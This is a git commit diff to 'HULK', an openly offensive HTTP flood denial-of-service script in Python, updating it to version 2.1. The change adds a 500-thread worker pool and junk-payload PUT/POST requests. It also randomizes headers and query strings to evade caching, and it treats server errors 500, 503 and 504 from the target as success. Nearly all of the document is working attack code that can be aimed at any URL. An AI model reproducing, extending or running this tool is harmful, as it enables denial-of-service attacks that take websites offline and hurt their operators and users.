b15ab03ca829a8a4bc7cbf291793438348dd5306
Harshith Thota <harshith.thota7@gmail.com>
2017-06-22 23:05:55 +0530

    Hulk v 2.1
    Implemented ThreadPooling, Payload Obfuscation, timeouts, etc.
    Fixed connection freezing bug.

--- hulk.py
+++ hulk.py
@@ -19,6 +19,8 @@
 #        5)Randomized buildblock size a bit more.
 #        6)Deprecated 'safe'.
 #        7)Improved Documentation.
+#        8)Added Threadpooling.
+#        9) Payload Obfuscation.
 #
 # Authors : Hyperclaw79, version 2.0; Barry Shteiman , version 1.0
 # -------------------------------------------------------------------------------------------- #
@@ -30,15 +32,24 @@ import random
 import re
 import time                   # For time.sleep
 
+from queue import Queue
+
 # Global Params
 global urlc
 urlc=''                       # To prevent conflict with url keyword of requests module  
 host=''
 headers_useragents=[]
 headers_referers=[]
+global request_counter
 request_counter=0
 flag=0
-safe=0
+q = Queue()
+global dt
+dt = []
+global status
+status = ""
+global fault
+fault = 0
 
 def inc_counter():
 	global request_counter
@@ -83,7 +94,7 @@ def buildblock(size):
 	out_str = ''
 	for i in range(size):
 		a = random.randint(65, 90)
-		out_str += str(a)
+		out_str += chr(a)
 	return(out_str)
 
 # User Instructions
@@ -93,21 +104,34 @@ def usage():
 	print('Example: python hulk.py https://abcxyz123.com')
 	print('---------------------------------------------------')
 
+def corrupt():		
+	for i in range(500):
+		dt.append(buildblock(random.randint(1,10)) + '\a' + buildblock(random.randint(1,10)))
 	
 # Main Function that sends a HTTPS request.
 def httpcall(urlc):
 	useragent_list()
 	referer_list()
 	code=0
-
+	global request_counter
+	global fault
+	global status
+	global dt
+	
 	if urlc.count("?")>0:          # For Quering type urls
 		param_joiner="&"
 	else:
 		param_joiner="?"
 
 	HeaderDict = {'User-Agent': random.choice(headers_useragents),'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Referer': random.choice(headers_referers) + buildblock(random.randint(random.randint(0,5),random.randint(6,10))),'Keep-Alive': str(random.randint(110,120)),'Connection': 'keep-alive','Host':host}
-	r = requests.get(url=urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10))),headers=HeaderDict)
+	urlreq = urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10)))
+
 	try:
+		try:
+			r = requests.put(url=urlreq,headers=HeaderDict,data=dt[request_counter],timeout=(15,30))
+		except:
+			r = requests.post(url=urlreq,headers=HeaderDict,data=dt[request_counter],timeout=(15,30))
+
 		if (str(r.status_code)=='500') or (str(r.status_code)=='503') or (str(r.status_code)=='504'):
 			set_flag(1)
 			print('Successful.')
@@ -121,37 +145,39 @@ def httpcall(urlc):
 		elif str(r.status_code)=='429':
 			print('Slowing down due to "Too many requests" error.')
 			time.sleep(5)
-		elif ("4" in str(r.status_code)) or ("5" in str(r.status_code)):       # For other unexpected errors, prints the error code. 
+		elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):       # For other unexpected HTTPS errors, prints the error code. 
 			print(str(r.status_code))
+		elif request_counter >= 500:
+			code = "Done"
 		else:
+			print('Sending crafted request: %s' % urlreq,flush=True)
 			inc_counter()
-			r = requests.get(url=urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10))),headers=HeaderDict)
-	except Exception as e:                                                         # For other non HTTP errors.
+			
+	except Exception as e:
 		print(str(e))
+		request_counter-=1
+		fault+=1
+
 	return(code)		
 
-	
-# Subclassing Threads to work with httpcall. 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(urlc)
-				if code==500:
-					set_flag(2)
-		except Exception as e:
-			print(str(e))
-
-# Monitors https threads and counts requests.
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) and (previous!=request_counter):
-				print("%d Requests Sent" % request_counter)
-				previous=request_counter
-		if flag==2:
-			print("\n-- HULK v2 Attack Finished --")
+# Queueing Threads to work with httpcall. 
+def dosExec():
+	while flag<2:
+		urlc = q.get()
+		code = httpcall(urlc)
+		if code==500:
+			set_flag(2)
+			status="successly. "
+			q.task_done()
+			return
+		elif code == "Done":
+			set_flag(2)
+			status="but failed. "
+			q.task_done()
+			return
+		q.task_done()
+		print("%d Requests Sent" % request_counter,flush=True)
+	return
 
 # Main code. 
 if len(sys.argv) < 2:
@@ -163,17 +189,27 @@ else:
 		sys.exit()
 	else:
 		print("-- HULK Attack Started --")
-		print("--Current Version: 2--")
-		print("--Compatible with: Python 3--")
-		print("--Edited by: Hyperclaw79--")
+		print("Current Version: 2.1")
+		print("Compatible with: Python 3")
+		print("Edited by: Hyperclaw79")
 		urlc = sys.argv[1]
 		if urlc.count("/")==2:
 			urlc = urlc + "/"
 		m = re.search('https\://([^/]*)/?.*', urlc)  
 		host = m.group(1)
-		for i in range(500):
-			t = HTTPThread()
-			t.run()
-			t = MonitorThread()
-			t.run()
+		corrupt()
+		for i in range(500+fault):
+			t = threading.Thread(target=dosExec)
+			t.daemon = True
+			t.start()
 
+		count = 0
+		for i in range(500+fault):
+			q.put(urlc)
+			count+=1
+			if count == 250:
+				time.sleep(0.1)
+				count = 0
+			
+		q.join()
+		print("\n-- HULK v2.1 Attack Finished %s--" % status)
